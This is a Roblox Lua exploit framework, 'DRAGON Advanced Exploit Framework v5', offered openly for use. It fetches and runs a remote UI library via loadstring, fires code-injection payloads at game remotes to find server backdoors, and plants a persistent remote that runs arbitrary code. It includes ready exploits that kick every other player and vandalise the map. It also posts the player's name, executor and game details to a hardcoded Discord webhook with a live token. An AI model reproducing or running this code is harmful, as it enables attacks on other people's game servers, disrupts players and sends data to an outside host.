local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")

local LocalPlayer = Players.LocalPlayer
local potentialBackdoors = {}
local selectedBackdoor = nil
local scanResults = {
    totalScanned = 0,
    backdoorsFound = 0,
    highRiskFound = 0,
    privilegeLevel = "Baixo"
}
local scanLogs = {}

local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1393537952465817620/StFW_hPAcWfWy_Ci7GSIopz_JQnmhtAmBJ_w87tZPX9Jn0nqpOZsGn6vaB3aksGMVuox"

local advancedTestPayloads = {
    -- Basic payloads
    { method = "FireServer", args = {"print('DRAGON: Basic test')"}, risk = "baixo" },
    { method = "InvokeServer", args = {"return 'DRAGON_BASIC'"}, risk = "baixo" },
    -- Structured payloads
    { method = "FireServer", args = {{Script = "print('DRAGON: Script detected')"}}, risk = "medio" },
    { method = "FireServer", args = {{Source = "print('DRAGON: Source detected')"}}, risk = "medio" },
    { method = "FireServer", args = {{Value = "print('DRAGON: Value detected')"}}, risk = "medio" },
    { method = "FireServer", args = {{Code = "print('DRAGON: Code detected')"}}, risk = "alto" },
    { method = "FireServer", args = {{Command = "print('DRAGON: Command detected')"}}, risk = "alto" },
    -- Escalation payloads
    { method = "FireServer", args = {{"print('DRAGON: String array')"}}, risk = "medio" },
    { method = "FireServer", args = {{[1] = "print('DRAGON: Indexed')"}}, risk = "medio" },
    { method = "FireServer", args = {{Key = "admin", Script = "print('DRAGON: Admin key')"}}, risk = "alto" },
    { method = "FireServer", args = {{Password = "123", Code = "print('DRAGON: Password')"}}, risk = "alto" },
    { method = "FireServer", args = {{Type = "Execute", Data = "print('DRAGON: Execute type')"}}, risk = "critico" },
    -- Critical payloads
    { method = "InvokeServer", args = {{Action = "Run", Script = "return 'DRAGON_CRITICAL'"}}, risk = "critico" },
    { method = "FireServer", args = {"loadstring", "print('DRAGON: Loadstring')"}, risk = "critico" },
    { method = "FireServer", args = {true, {Script = "print('DRAGON: Boolean bypass')"}}, risk = "critico" },
    { method = "FireServer", args = {{Admin = true, Script = "print('DRAGON: Admin bypass')"}}, risk = "critico" },
    -- New bypass payloads
    { method = "FireServer", args = {base64.encode("print('DRAGON: Base64 bypass')")}, risk = "alto" },
    { method = "FireServer", args = {{obfuscated = bit32.bxor(123456, 654321), Script = "print('DRAGON: XOR bypass')"}}, risk = "alto" }
}

local privilegeTestPayloads = {
    basic = [[
        pcall(function()
            print("🔍 DRAGON: Testing basic access...")
            local players = game:GetService("Players"):GetPlayers()
            print("🔍 DRAGON: Access to " .. #players .. " players")
        end)
    ]],
    advanced = [[
        local results = {}
        -- Testing ServerStorage
        pcall(function()
            local ss = game:GetService("ServerStorage")
            if ss then
                results[#results+1] = "ServerStorage: ACCESSIBLE"
            end
        end)
        -- Testing ServerScriptService
        pcall(function()
            local sss = game:GetService("ServerScriptService")
            if sss then
                results[#results+1] = "ServerScriptService: ACCESSIBLE"
            end
        end)
        -- Testing Workspace editing
        pcall(function()
            local part = Instance.new("Part")
            part.Name = "DRAGON_TEST"
            part.Parent = workspace
            part:Destroy()
            results[#results+1] = "Workspace: EDITABLE"
        end)
        for _, result in pairs(results) do
            print("🔓 DRAGON PRIVILEGE: " .. result)
        end
    ]],
    critical = [[
        local criticalTests = {
            "🚨 TESTING CRITICAL ACCESS...",
            "Attempting security bypass...",
            "Checking admin permissions..."
        }
        for _, test in pairs(criticalTests) do
            print("🔴 DRAGON CRITICAL: " .. test)
        end
        pcall(function()
            local testRemote = Instance.new("RemoteEvent")
            testRemote.Name = "DRAGON_INJECTED_REMOTE"
            testRemote.Parent = game.ReplicatedStorage
            print("🔴 DRAGON: REMOTE INJECTION - SUCCESS!")
        end)
    ]]
}

local function logAction(action, details)
    table.insert(scanLogs, {
        timestamp = os.date("%Y-%m-%d %H:%M:%S"),
        action = action,
        details = details
    })
end

local function deepScanForBackdoors()
    potentialBackdoors = {}
    scanResults = {totalScanned = 0, backdoorsFound = 0, highRiskFound = 0, privilegeLevel = "Baixo"}
    
    logAction("Scan Started", "Initiating deep scan")
    print("🔍 DRAGON: Initiating Advanced Deep Scan...")
    
    local servicesToScan = {
        ReplicatedStorage,
        Workspace,
        StarterGui,
        Lighting
    }
    
    for _, service in pairs(servicesToScan) do
        print("📡 Scanning: " .. service.Name)
        
        for _, obj in pairs(service:GetDescendants()) do
            scanResults.totalScanned = scanResults.totalScanned + 1
            
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or obj:IsA("BindableEvent") or obj:IsA("BindableFunction") then
                local method = (obj:IsA("RemoteEvent") or obj:IsA("BindableEvent")) and "FireServer" or "InvokeServer"
                
                for i, payload in pairs(advancedTestPayloads) do
                    if payload.method == method then
                        local success, result = pcall(function()
                            if method == "FireServer" then
                                obj:FireServer(unpack(payload.args))
                            else
                                return obj:InvokeServer(unpack(payload.args))
                            end
                        end)
                        
                        if success and (result == nil or type(result) == "string" or type(result) == "table") then
                            local remotePath = obj:GetFullName()
                            local riskLevel = payload.risk or "medio"
                            
                            if not table.find(potentialBackdoors, function(bd) return bd.remote == obj end) then
                                table.insert(potentialBackdoors, {
                                    remote = obj,
                                    method = method,
                                    name = obj.Name or "Unknown",
                                    fullPath = remotePath,
                                    riskLevel = riskLevel,
                                    workingPayload = payload,
                                    service = service.Name
                                })
                                
                                scanResults.backdoorsFound = scanResults.backdoorsFound + 1
                                if riskLevel == "alto" or riskLevel == "critico" then
                                    scanResults.highRiskFound = scanResults.highRiskFound + 1
                                end
                                
                                print("🎯 BACKDOOR FOUND: " .. remotePath .. " [" .. riskLevel .. "]")
                                logAction("Backdoor Found", remotePath .. " [" .. riskLevel .. "]")
                            end
                            break
                        end
                        wait(math.random(0.1, 0.3)) -- Anti-flood delay
                    end
                end
            elseif obj:IsA("ModuleScript") then
                local success, content = pcall(function() return require(obj) end)
                if success and type(content) == "string" and (content:find("admin") or content:find("execute") or content:find("script")) then
                    table.insert(potentialBackdoors, {
                        remote = obj,
                        method = "Require",
                        name = obj.Name or "Unknown",
                        fullPath = obj:GetFullName(),
                        riskLevel = "medio",
                        workingPayload = {method = "Require", args = {}},
                        service = service.Name
                    })
                    scanResults.backdoorsFound = scanResults.backdoorsFound + 1
                    print("🎯 MODULE BACKDOOR FOUND: " .. obj:GetFullName() .. " [medio]")
                    logAction("Module Backdoor Found", obj:GetFullName() .. " [medio]")
                end
            end
        end
    end
    
    if scanResults.highRiskFound > 0 then
        scanResults.privilegeLevel = "CRÍTICO"
    elseif scanResults.backdoorsFound > 5 then
        scanResults.privilegeLevel = "Alto"
    elseif scanResults.backdoorsFound > 0 then
        scanResults.privilegeLevel = "Médio"
    end
    
    print("📊 DRAGON SCAN COMPLETE:")
    print("   • Total scanned: " .. scanResults.totalScanned)
    print("   • Backdoors: " .. scanResults.backdoorsFound)
    print("   • High risk: " .. scanResults.highRiskFound)
    print("   • Level: " .. scanResults.privilegeLevel)
    
    return scanResults.backdoorsFound > 0
end

local function sendAdvancedWebhook()
    if scanResults.backdoorsFound == 0 then return end
    
    spawn(function()
        wait(0.5)
        local success = pcall(function()
            local backdoorList = {}
            local riskStats = {baixo = 0, medio = 0, alto = 0, critico = 0}
            
            for _, bd in pairs(potentialBackdoors) do
                local riskEmoji = bd.riskLevel == "critico" and "🔴" or 
                                 bd.riskLevel == "alto" and "🟠" or
                                 bd.riskLevel == "medio" and "🟡" or "🟢"
                
                table.insert(backdoorList, riskEmoji .. " " .. bd.name .. " [" .. bd.service .. "/" .. bd.method .. "]")
                riskStats[bd.riskLevel] = riskStats[bd.riskLevel] + 1
            end

            local executor = "Unknown"
            if syn then executor = "Synapse"
            elseif KRNL_LOADED then executor = "KRNL"
            elseif identifyexecutor then executor = identifyexecutor() end

            local webhookData = {
                username = "DRAGON Advanced Logger",
                embeds = {{
                    title = "🐉 SERVER COMPROMISED - DRAGON SCAN",
                    description = "**🎯 TARGET COMPROMISED**\n" ..
                                 "👤 **Player:** " .. LocalPlayer.Name .. "\n" ..
                                 "⚡ **Executor:** " .. executor .. "\n" ..
                                 "🎮 **Game:** " .. (game.Name ~= "" and game.Name or ("PlaceId: " .. game.PlaceId)) .. "\n" ..
                                 "📊 **Objects Scanned:** " .. scanResults.totalScanned .. "\n" ..
                                 "🎯 **Backdoors Found:** " .. scanResults.backdoorsFound .. "\n" ..
                                 "⚠️ **High Risk:** " .. scanResults.highRiskFound .. "\n" ..
                                 "🔥 **Privilege Level:** " .. scanResults.privilegeLevel .. "\n\n" ..
                                 "**📋 DETECTED BACKDOORS:**\n```" .. table.concat(backdoorList, "\n") .. "```\n\n" ..
                                 "**📈 RISK STATISTICS:**\n" ..
                                 "🔴 Critical: " .. riskStats.critico .. "\n" ..
                                 "🟠 High: " .. riskStats.alto .. "\n" ..
                                 "🟡 Medium: " .. riskStats.medio .. "\n" ..
                                 "🟢 Low: " .. riskStats.baixo,
                    color = scanResults.privilegeLevel == "CRÍTICO" and 16711680 or 
                           scanResults.privilegeLevel == "Alto" and 16753920 or 65280,
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            }

            local sent = false
            if request and not sent then
                pcall(function()
                    request({
                        Url = DISCORD_WEBHOOK,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(webhookData)
                    })
                    sent = true
                end)
            end
            
            if http_request and not sent then
                pcall(function()
                    http_request({
                        Url = DISCORD_WEBHOOK,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(webhookData)
                    })
                    sent = true
                end)
            end
            
            print(sent and "✅ [DRAGON] Advanced webhook sent!" or "⚠️ [DRAGON] Webhook failed")
            logAction("Webhook Sent", sent and "Success" or "Failed")
        end)
    end)
end

local function persistBackdoor()
    local success = pcall(function()
        local persistentRemote = Instance.new("RemoteEvent")
        persistentRemote.Name = "DRAGON_PERSIST_" .. math.random(1000, 9999)
        persistentRemote.Parent = ReplicatedStorage
        persistentRemote.OnServerEvent:Connect(function(player, code)
            if player == LocalPlayer then
                loadstring(code)()
            end
        end)
        logAction("Persistence", "Created persistent backdoor: " .. persistentRemote.Name)
    end)
    return success
end

local Window = Rayfield:CreateWindow({
    Name = "DRAGON Advanced Exploit Framework v5",
    LoadingTitle = "Advanced Penetration System",
    LoadingSubtitle = "🐉 DRAGON Security Research Tool",
    ConfigurationSaving = {Enabled = false}
})

local ScanTab = Window:CreateTab("🔍 Deep Scan", 4483362458)
local ExploitTab = Window:CreateTab("⚡ Exploits", 4483362458)
local PrivilegeTab = Window:CreateTab("🔓 Privilege", 4483362458)
local AdvancedTab = Window:CreateTab("🚀 Advanced", 4483362458)
local InfoTab = Window:CreateTab("📊 Info", 4483362458)
local LogsTab = Window:CreateTab("📜 Logs", 4483362458)

local BackdoorDropdown

local function updateBackdoorList(filter)
    local backdoorNames = {}
    local filteredBackdoors = potentialBackdoors
    
    if filter and filter ~= "" then
        filteredBackdoors = {}
        for _, bd in pairs(potentialBackdoors) do
            if string.find(string.lower(bd.name .. bd.riskLevel .. bd.service), string.lower(filter)) then
                table.insert(filteredBackdoors, bd)
            end
        end
    end
    
    if #filteredBackdoors > 0 then
        for i, bd in pairs(filteredBackdoors) do
            local riskEmoji = bd.riskLevel == "critico" and "🔴" or 
                             bd.riskLevel == "alto" and "🟠" or
                             bd.riskLevel == "medio" and "🟡" or "🟢"
            local displayName = riskEmoji .. " " .. bd.name .. " [" .. bd.riskLevel .. "] (" .. bd.service .. ")"
            backdoorNames[i] = displayName
        end
        selectedBackdoor = filteredBackdoors[1]
    else
        backdoorNames = {"None found"}
        selectedBackdoor = nil
    end
    
    BackdoorDropdown:Refresh(backdoorNames, true)
    if #filteredBackdoors > 0 then
        BackdoorDropdown:Set(backdoorNames[1])
    end
end

BackdoorDropdown = ScanTab:CreateDropdown({
    Name = "🎯 Select Backdoor",
    Options = {"None found"},
    CurrentOption = "None found",
    Callback = function(option)
        print("🔍 [DEBUG] Selected option: " .. tostring(option))
        if option == "None found" then
            selectedBackdoor = nil
            Rayfield:Notify({
                Title = "⚠️ No Backdoor",
                Content = "No backdoor selected!",
                Duration = 4
            })
            return
        end
        
        for _, bd in pairs(potentialBackdoors) do
            local riskEmoji = bd.riskLevel == "critico" and "🔴" or 
                             bd.riskLevel == "alto" and "🟠" or
                             bd.riskLevel == "medio" and "🟡" or "🟢"
            local displayName = riskEmoji .. " " .. bd.name .. " [" .. bd.riskLevel .. "] (" .. bd.service .. ")"
            
            if option == displayName then
                selectedBackdoor = bd
                Rayfield:Notify({
                    Title = "✅ Target Locked",
                    Content = "Target: " .. bd.name .. " (" .. bd.riskLevel .. ")",
                    Duration = 4
                })
                print("✅ [DEBUG] Backdoor selected: " .. bd.name)
                logAction("Backdoor Selected", bd.name .. " (" .. bd.riskLevel .. ")")
                return
            end
        end
        
        selectedBackdoor = nil
        Rayfield:Notify({
            Title = "❌ Error",
            Content = "Backdoor not found in list! Try scanning again.",
            Duration = 4
        })
        print("❌ [DEBUG] No match found for: " .. tostring(option))
    end
})

ScanTab:CreateInput({
    Name = "🔎 Filter Backdoors",
    PlaceholderText = "Enter filter (name/risk/service)...",
    RemoveTextAfterFocusLost = false,
    Callback = function(value)
        updateBackdoorList(value)
    end
})

ScanTab:CreateButton({
    Name = "🔍 Advanced Deep Scan",
    Callback = function()
        Rayfield:Notify({
            Title = "🔄 Deep Scanning...",
            Content = "Executing deep scan...",
            Duration = 5
        })

        local found = deepScanForBackdoors()
        updateBackdoorList()
        
        if found then
            sendAdvancedWebhook()
            persistBackdoor()
        end

        local resultTitle = found and "✅ Server Compromised!" or "🛡️ Server Secure"
        local resultContent = found and 
            (scanResults.backdoorsFound .. " backdoors | " .. scanResults.highRiskFound .. " critical | Level: " .. scanResults.privilegeLevel) or
            "No vulnerabilities detected"

        Rayfield:Notify({
            Title = resultTitle,
            Content = resultContent,
            Duration = 8
        })
    end
})

ScanTab:CreateButton({
    Name = "🧪 Test Selected Backdoor",
    Callback = function()
        if not selectedBackdoor then
            return Rayfield:Notify({
                Title = "❌ Error",
                Content = "Select a backdoor first!",
                Duration = 4
            })
        end

        local testCode = "print('🧪 DRAGON TEST: " .. selectedBackdoor.name .. " - FUNCTIONAL!')"
        local success, result = pcall(function()
            if selectedBackdoor.method == "FireServer" then
                selectedBackdoor.remote:FireServer(testCode)
            elseif selectedBackdoor.method == "InvokeServer" then
                return selectedBackdoor.remote:InvokeServer(testCode)
            elseif selectedBackdoor.method == "Require" then
                return require(selectedBackdoor.remote)
            end
        end)

        Rayfield:Notify({
            Title = success and "✅ Test Confirmed" or "❌ Test Failed",
            Content = success and ("Backdoor " .. selectedBackdoor.name .. " confirmed functional") or ("Error: " .. tostring(result)),
            Duration = 5
        })
        logAction("Backdoor Test", selectedBackdoor.name .. (success and " Success" or " Failed: " .. tostring(result)))
    end
})

local CustomPayload = ScanTab:CreateInput({
    Name = "💻 Custom Payload",
    PlaceholderText = "Enter Lua code...",
    RemoveTextAfterFocusLost = false,
    Callback = function() end
})

ScanTab:CreateButton({
    Name = "🚀 Execute Custom Payload",
    Callback = function()
        if not selectedBackdoor then
            return Rayfield:Notify({
                Title = "❌ Error",
                Content = "Select a backdoor!",
                Duration = 4
            })
        end

        local code = CustomPayload.Value or "print('🐉 DRAGON Custom Payload Executed!')"
        local encodedCode = base64.encode(code) -- Encrypted payload
        
        local success, result = pcall(function()
            if selectedBackdoor.method == "FireServer" then
                selectedBackdoor.remote:FireServer(encodedCode)
            elseif selectedBackdoor.method == "InvokeServer" then
                return selectedBackdoor.remote:InvokeServer(encodedCode)
            elseif selectedBackdoor.method == "Require" then
                return require(selectedBackdoor.remote)
            end
        end)

        Rayfield:Notify({
            Title = success and "✅ Payload Executed" or "❌ Failed",
            Content = success and "Custom code injected!" or ("Error: " .. tostring(result)),
            Duration = 6
        })
        logAction("Custom Payload", success and "Executed" or "Failed: " .. tostring(result))
    end
})

PrivilegeTab:CreateLabel("🔓 Privilege Escalation")

PrivilegeTab:CreateButton({
    Name = "🔍 Basic Privilege Test",
    Callback = function()
        if not selectedBackdoor then
            return Rayfield:Notify({
                Title = "❌ Error",
                Content = "Select a backdoor!",
                Duration = 4
            })
        end

        local success, result = pcall(function()
            if selectedBackdoor.method == "FireServer" then
                selectedBackdoor.remote:FireServer(privilegeTestPayloads.basic)
            elseif selectedBackdoor.method == "InvokeServer" then
                return selectedBackdoor.remote:InvokeServer(privilegeTestPayloads.basic)
            end
        end)

        Rayfield:Notify({
            Title = success and "🔍 Test Sent" or "❌ Failed",
            Content = success and ("Basic access test sent: " .. tostring(result)) or "Error in test",
            Duration = 5
        })
        logAction("Basic Privilege Test", success and "Sent" or "Failed")
    end
})

PrivilegeTab:CreateButton({
    Name = "🔓 Advanced Privilege Test",
    Callback = function()
        if not selectedBackdoor then
            return Rayfield:Notify({
                Title = "❌ Error",
                Content = "Select a backdoor!",
                Duration = 4
            })
        end

        local success, result = pcall(function()
            if selectedBackdoor.method == "FireServer" then
                selectedBackdoor.remote:FireServer(privilegeTestPayloads.advanced)
            elseif selectedBackdoor.method == "InvokeServer" then
                return selectedBackdoor.remote:InvokeServer(privilegeTestPayloads.advanced)
            end
        end)

        Rayfield:Notify({
            Title = success and "🔓 Escalation Tested" or "❌ Failed",
            Content = success and ("Advanced privilege test sent: " .. tostring(result)) or "Error in escalation",
            Duration = 5
        })
        logAction("Advanced Privilege Test", success and "Sent" or "Failed")
    end
})

PrivilegeTab:CreateButton({
    Name = "🚨 Critical Test (High Risk)",
    Callback = function()
        if not selectedBackdoor then
            return Rayfield:Notify({
                Title = "❌ Error",
                Content = "Select a backdoor!",
                Duration = 4
            })
        end

        Rayfield:Notify({
            Title = "⚠️ Executing Critical Test",
            Content = "WARNING: High-risk test in progress...",
            Duration = 3
        })

        local success, result = pcall(function()
            if selectedBackdoor.method == "FireServer" then
                selectedBackdoor.remote:FireServer(privilegeTestPayloads.critical)
            elseif selectedBackdoor.method == "InvokeServer" then
                return selectedBackdoor.remote:InvokeServer(privilegeTestPayloads.critical)
            end
        end)

        Rayfield:Notify({
            Title = success and "🚨 Critical Test Executed" or "❌ Critical Failure",
            Content = success and ("Max privilege test sent: " .. tostring(result)) or "Error in critical test",
            Duration = 6
        })
        logAction("Critical Test", success and "Sent" or "Failed")
    end
})

local advancedExploits = {
    {
        name = "💀 Admin Takeover",
        code = [[
            print("🐉 DRAGON: Initiating Admin Takeover...")
            local players = game:GetService("Players"):GetPlayers()
            for _, player in pairs(players) do
                if player ~= game.Players.LocalPlayer then
                    pcall(function()
                        player:Kick("🐉 Server compromised by DRAGON")
                    end)
                end
            end
            print("🐉 DRAGON: Takeover complete!")
        ]]
    },
    {
        name = "🌐 Server Transformation",
        code = [[
            print("🐉 DRAGON: Transforming server...")
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Name ~= "Baseplate" then
                    obj.BrickColor = BrickColor.Random()
                    obj.Material = Enum.Material.ForceField
                    obj.Transparency = math.random(0, 5) / 10
                end
            end
            print("🐉 DRAGON: Server transformed!")
        ]]
    },
    {
        name = "⚔️ Ultimate Admin Kit",
        code = [[
            print("🐉 DRAGON: Creating Ultimate Admin Kit...")
            local player = game.Players.LocalPlayer
            local tool = Instance.new("Tool")
            tool.Name = "🐉 DRAGON Ultimate Staff"
            local handle = Instance.new("Part")
            handle.Name = "Handle"
            handle.Size = Vector3.new(1, 10, 1)
            handle.BrickColor = BrickColor.new("Really red")
            handle.Material = Enum.Material.Neon
            handle.CanCollide = false
            local light = Instance.new("PointLight")
            light.Color = Color3.new(1, 0, 0)
            light.Brightness = 3
            light.Range = 20
            light.Parent = handle
            handle.Parent = tool
            tool.Parent = player.Backpack
            print("🐉 DRAGON: Ultimate Kit delivered!")
        ]]
    },
    {
        name = "📡 Server Info Collector",
        code = [[
            local info = {}
            pcall(function()
                local ss = game:GetService("ServerStorage")
                local sss = game:GetService("ServerScriptService")
                info.ServerStorage = #ss:GetChildren()
                info.ServerScripts = #sss:GetChildren()
                info.Players = #game:GetService("Players"):GetPlayers()
            end)
            return HttpService:JSONEncode(info)
        ]]
    }
}

local exploitNames = {}
for _, exploit in pairs(advancedExploits) do
    table.insert(exploitNames, exploit.name)
end

local ExploitDropdown = ExploitTab:CreateDropdown({
    Name = "⚡ Select Exploit",
    Options = exploitNames,
    CurrentOption = exploitNames[1],
    Callback = function() end
})

ExploitTab:CreateButton({
    Name = "⚡ Execute Selected Exploit",
    Callback = function()
        if not selectedBackdoor then
            return Rayfield:Notify({
                Title = "❌ Error",
                Content = "Select a backdoor first!",
                Duration = 4
            })
        end

        local selectedName = ExploitDropdown.CurrentOption
        local exploitCode = nil
        
        for _, exploit in pairs(advancedExploits) do
            if exploit.name == selectedName then
                exploitCode = exploit.code
                break
            end
        end

        if not exploitCode then
            return Rayfield:Notify({
                Title = "❌ Error",
                Content = "Exploit not found!",
                Duration = 4
            })
        end

        local success, result = pcall(function()
            if selectedBackdoor.method == "FireServer" then
                selectedBackdoor.remote:FireServer(base64.encode(exploitCode))
            elseif selectedBackdoor.method == "InvokeServer" then
                return selectedBackdoor.remote:InvokeServer(base64.encode(exploitCode))
            elseif selectedBackdoor.method == "Require" then
                return require(selectedBackdoor.remote)
            end
        end)

        local exploitNameStr = tostring(selectedName) or "Unknown Exploit"
        
        Rayfield:Notify({
            Title = success and "✅ Exploit Executed" or "❌ Failed",
            Content = success and ("Exploit executed: " .. exploitNameStr .. " Result: " .. tostring(result)) or "Error in execution",
            Duration = 6
        })
        logAction("Exploit Executed", exploitNameStr .. (success and " Success" or " Failed"))
    end
})

ExploitTab:CreateButton({
    Name = "💥 Mass Attack",
    Callback = function()
        if #potentialBackdoors == 0 then
            return Rayfield:Notify({
                Title = "❌ Error",
                Content = "No backdoors found!",
                Duration = 4
            })
        end

        for _, bd in pairs(potentialBackdoors) do
            for _, exploit in pairs(advancedExploits) do
                pcall(function()
                    if bd.method == "FireServer" then
                        bd.remote:FireServer(base64.encode(exploit.code))
                    elseif bd.method == "InvokeServer" then
                        bd.remote:InvokeServer(base64.encode(exploit.code))
                    end
                end)
                wait(math.random(0.2, 0.5))
            end
        end

        Rayfield:Notify({
            Title = "💥 Mass Attack Executed",
            Content = "Executed all exploits on all backdoors!",
            Duration = 6
        })
        logAction("Mass Attack", "Executed all exploits")
    end
})

LogsTab:CreateParagraph({
    Title = "📜 Scan Logs",
    Content = "Scan logs will appear here..."
})

LogsTab:CreateButton({
    Name = "🔄 Refresh Logs",
    Callback = function()
        local logText = ""
        for _, log in pairs(scanLogs) do
            logText = logText .. "[" .. log.timestamp .. "] " .. log.action .. ": " .. log.details .. "\n"
        end
        LogsTab:CreateParagraph({
            Title = "📜 Scan Logs",
            Content = logText ~= "" and logText or "No logs available"
        })
    end
})

LogsTab:CreateButton({
    Name = "💾 Export Logs",
    Callback = function()
        local logText = ""
        for _, log in pairs(scanLogs) do
            logText = logText .. "[" .. log.timestamp .. "] " .. log.action .. ": " .. log.details .. "\n"
        end
        writefile("dragon_logs.txt", logText)
        Rayfield:Notify({
            Title = "💾 Logs Exported",
            Content = "Logs exported to dragon_logs.txt",
            Duration = 4
        })
    end
})

InfoTab:CreateLabel("📊 System Information")
InfoTab:CreateLabel("👤 Player: " .. LocalPlayer.Name)
InfoTab:CreateLabel("🎮 Game: " .. (game.Name ~= "" and game.Name or ("PlaceId: " .. game.PlaceId)))
InfoTab:CreateLabel("🔧 Executor: " .. (identifyexecutor and identifyexecutor() or "Unknown"))
InfoTab:CreateLabel("🐉 DRAGON Framework v5.0")

ScanTab:CreateButton({
    Name = "🗑️ Complete Reset",
    Callback = function()
        potentialBackdoors = {}
        selectedBackdoor = nil
        scanResults = {totalScanned = 0, backdoorsFound = 0, highRiskFound = 0, privilegeLevel = "Baixo"}
        scanLogs = {}
        updateBackdoorList()
        
        Rayfield:Notify({
            Title = "🗑️ Complete Reset",
            Content = "All data cleared!",
            Duration = 3
        })
        logAction("Reset", "All data cleared")
    end
})

Rayfield:Notify({
    Title = "🐉 DRAGON Advanced Framework v5",
    Content = "Advanced penetration system loaded. Use 'Advanced Deep Scan' to begin.",
    Duration = 10
})

print("🐉 DRAGON Advanced Exploit Framework v5 loaded!")
print("🔥 Features: Deep Scan, Privilege Escalation, Advanced Exploits")
print("⚡ Ready for advanced server penetration!")
